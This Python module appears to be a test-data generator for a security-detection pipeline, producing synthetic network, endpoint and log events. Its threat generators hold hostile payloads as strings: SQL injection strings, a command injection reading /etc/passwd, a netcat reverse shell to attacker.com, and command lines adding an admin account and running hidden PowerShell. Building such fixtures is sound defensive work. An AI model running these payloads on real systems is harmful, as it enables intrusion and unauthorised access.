"""
Sample test data fixtures and generators
"""

import uuid
from datetime import datetime, timedelta
from typing import List
import random

from src.data_pipeline.schemas import NetworkEvent, EndpointEvent, ApplicationLog, Protocol, Severity


class SampleDataGenerator:
    """Generate realistic sample data for testing"""

    def __init__(self, seed: int = 42):
        """Initialize with random seed"""
        random.seed(seed)

    def generate_network_events(self, count: int = 100, threat_ratio: float = 0.05) -> List[NetworkEvent]:
        """
        Generate network events with specified threat ratio

        Args:
            count: Number of events to generate
            threat_ratio: Proportion of events that are threats (0.0-1.0)

        Returns:
            List of NetworkEvent objects
        """
        events = []
        threat_count = int(count * threat_ratio)

        # Generate benign events
        for i in range(count - threat_count):
            events.append(self._generate_benign_network_event())

        # Generate threat events
        for i in range(threat_count):
            events.append(self._generate_threat_network_event())

        random.shuffle(events)
        return events

    def _generate_benign_network_event(self) -> NetworkEvent:
        """Generate a benign network event"""
        protocols = [Protocol.HTTP, Protocol.HTTPS, Protocol.DNS, Protocol.TCP]
        protocol = random.choice(protocols)

        common_ports = [80, 443, 53, 22, 25, 587, 3306, 5432]

        event = NetworkEvent(
            event_id=f"net-{uuid.uuid4().hex[:12]}",
            source_system="zeek",
            source_ip=self._generate_private_ip(),
            destination_ip=self._generate_public_ip(),
            source_port=random.randint(49152, 65535),
            destination_port=random.choice(common_ports),
            protocol=protocol,
            bytes_sent=random.randint(100, 5000),
            bytes_received=random.randint(100, 10000),
            packets_sent=random.randint(1, 50),
            packets_received=random.randint(1, 100)
        )

        # Add protocol-specific fields
        if protocol == Protocol.DNS:
            event.dns_query = random.choice([
                "google.com",
                "github.com",
                "stackoverflow.com",
                "amazon.com",
                "microsoft.com"
            ])
        elif protocol in [Protocol.HTTP, Protocol.HTTPS]:
            event.http_method = random.choice(["GET", "POST", "PUT"])
            event.http_uri = random.choice(["/api/users", "/api/data", "/login", "/dashboard"])
            event.http_status_code = random.choice([200, 201, 204, 301, 302])
            event.http_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

        return event

    def _generate_threat_network_event(self) -> NetworkEvent:
        """Generate a suspicious/threat network event"""
        threat_types = ["port_scan", "dns_tunneling", "sql_injection", "command_injection"]
        threat_type = random.choice(threat_types)

        if threat_type == "port_scan":
            return self._generate_port_scan_event()
        elif threat_type == "dns_tunneling":
            return self._generate_dns_tunneling_event()
        elif threat_type == "sql_injection":
            return self._generate_sql_injection_event()
        else:
            return self._generate_command_injection_event()

    def _generate_port_scan_event(self) -> NetworkEvent:
        """Generate port scan event"""
        return NetworkEvent(
            event_id=f"net-{uuid.uuid4().hex[:12]}",
            source_system="zeek",
            source_ip=self._generate_private_ip(),
            destination_ip=self._generate_private_ip(),
            source_port=random.randint(49152, 65535),
            destination_port=random.randint(1, 1024),  # Scanning low ports
            protocol=Protocol.TCP,
            bytes_sent=64,  # SYN packet
            bytes_received=0,  # No response
            packets_sent=1,
            packets_received=0,
            flags="SYN"
        )

    def _generate_dns_tunneling_event(self) -> NetworkEvent:
        """Generate DNS tunneling event"""
        # High entropy domain
        subdomain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))

        return NetworkEvent(
            event_id=f"net-{uuid.uuid4().hex[:12]}",
            source_system="zeek",
            source_ip=self._generate_private_ip(),
            destination_ip="8.8.8.8",
            source_port=random.randint(49152, 65535),
            destination_port=53,
            protocol=Protocol.DNS,
            bytes_sent=random.randint(500, 1500),  # Large DNS query
            bytes_received=random.randint(500, 1500),
            dns_query=f"{subdomain}.malicious-domain.com"
        )

    def _generate_sql_injection_event(self) -> NetworkEvent:
        """Generate SQL injection attempt"""
        sql_payloads = [
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT NULL--",
            "; DROP TABLE users--"
        ]

        return NetworkEvent(
            event_id=f"net-{uuid.uuid4().hex[:12]}",
            source_system="zeek",
            source_ip=self._generate_public_ip(),  # External attacker
            destination_ip=self._generate_private_ip(),
            source_port=random.randint(49152, 65535),
            destination_port=443,
            protocol=Protocol.HTTPS,
            bytes_sent=random.randint(200, 1000),
            bytes_received=random.randint(100, 500),
            http_method="POST",
            http_uri=f"/login?username={random.choice(sql_payloads)}",
            http_status_code=500,
            http_user_agent="sqlmap/1.0"
        )

    def _generate_command_injection_event(self) -> NetworkEvent:
        """Generate command injection attempt"""
        cmd_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "&& nc -e /bin/sh attacker.com 4444"
        ]

        return NetworkEvent(
            event_id=f"net-{uuid.uuid4().hex[:12]}",
            source_system="zeek",
            source_ip=self._generate_public_ip(),
            destination_ip=self._generate_private_ip(),
            source_port=random.randint(49152, 65535),
            destination_port=80,
            protocol=Protocol.HTTP,
            bytes_sent=random.randint(300, 1500),
            bytes_received=random.randint(100, 500),
            http_method="GET",
            http_uri=f"/api/exec?cmd={random.choice(cmd_payloads)}",
            http_status_code=403
        )

    def generate_endpoint_events(self, count: int = 100) -> List[EndpointEvent]:
        """Generate endpoint security events"""
        events = []

        for i in range(count):
            if random.random() < 0.1:  # 10% suspicious
                events.append(self._generate_suspicious_endpoint_event())
            else:
                events.append(self._generate_benign_endpoint_event())

        return events

    def _generate_benign_endpoint_event(self) -> EndpointEvent:
        """Generate benign endpoint event"""
        processes = [
            ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --no-sandbox"),
            ("outlook.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"),
            ("teams.exe", "C:\\Users\\user\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"),
        ]

        process, cmdline = random.choice(processes)

        return EndpointEvent(
            event_id=f"ep-{uuid.uuid4().hex[:12]}",
            source_system="sysmon",
            hostname=f"DESKTOP-{random.randint(1000, 9999)}",
            username=random.choice(["john.doe", "jane.smith", "admin"]),
            process_name=process,
            process_id=random.randint(1000, 9999),
            command_line=cmdline,
            event_code=1  # Process creation
        )

    def _generate_suspicious_endpoint_event(self) -> EndpointEvent:
        """Generate suspicious endpoint event"""
        suspicious_commands = [
            ("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File malware.ps1"),
            ("cmd.exe", "cmd.exe /c whoami && net user admin password123 /add"),
            ("wscript.exe", "wscript.exe C:\\Temp\\suspicious.vbs"),
        ]

        process, cmdline = random.choice(suspicious_commands)

        return EndpointEvent(
            event_id=f"ep-{uuid.uuid4().hex[:12]}",
            source_system="sysmon",
            hostname=f"DESKTOP-{random.randint(1000, 9999)}",
            username="admin",
            process_name=process,
            process_id=random.randint(1000, 9999),
            command_line=cmdline,
            event_code=1
        )

    def generate_application_logs(self, count: int = 100) -> List[ApplicationLog]:
        """Generate application logs"""
        logs = []

        for i in range(count):
            if random.random() < 0.05:  # 5% errors
                logs.append(self._generate_error_log())
            else:
                logs.append(self._generate_info_log())

        return logs

    def _generate_info_log(self) -> ApplicationLog:
        """Generate info-level log"""
        return ApplicationLog(
            event_id=f"app-{uuid.uuid4().hex[:12]}",
            source_system="nginx",
            application_name="web-server",
            log_level="INFO",
            message=random.choice([
                "User logged in successfully",
                "GET /api/users completed",
                "POST /api/data processed"
            ]),
            source_ip=self._generate_public_ip(),
            http_method=random.choice(["GET", "POST", "PUT"]),
            http_status_code=random.choice([200, 201, 204]),
            response_time_ms=random.uniform(10, 500)
        )

    def _generate_error_log(self) -> ApplicationLog:
        """Generate error-level log"""
        return ApplicationLog(
            event_id=f"app-{uuid.uuid4().hex[:12]}",
            source_system="nginx",
            application_name="web-server",
            log_level="ERROR",
            message=random.choice([
                "Database connection failed",
                "Authentication error: Invalid credentials",
                "SQL injection attempt detected"
            ]),
            source_ip=self._generate_public_ip(),
            http_method=random.choice(["POST", "PUT"]),
            http_status_code=random.choice([400, 401, 403, 500, 503]),
            response_time_ms=random.uniform(1000, 5000)
        )

    @staticmethod
    def _generate_private_ip() -> str:
        """Generate private IP address"""
        return f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"

    @staticmethod
    def _generate_public_ip() -> str:
        """Generate public IP address"""
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


# Example usage
if __name__ == "__main__":
    generator = SampleDataGenerator()

    print("=== Sample Network Events ===")
    network_events = generator.generate_network_events(count=10, threat_ratio=0.3)

    for event in network_events:
        print(f"Event: {event.event_id}")
        print(f"  Protocol: {event.protocol.value}")
        print(f"  {event.source_ip}:{event.source_port} -> {event.destination_ip}:{event.destination_port}")
        print()

    print("\n=== Sample Endpoint Events ===")
    endpoint_events = generator.generate_endpoint_events(count=5)

    for event in endpoint_events:
        print(f"Event: {event.event_id}")
        print(f"  Process: {event.process_name}")
        print(f"  Command: {event.command_line}")
        print()
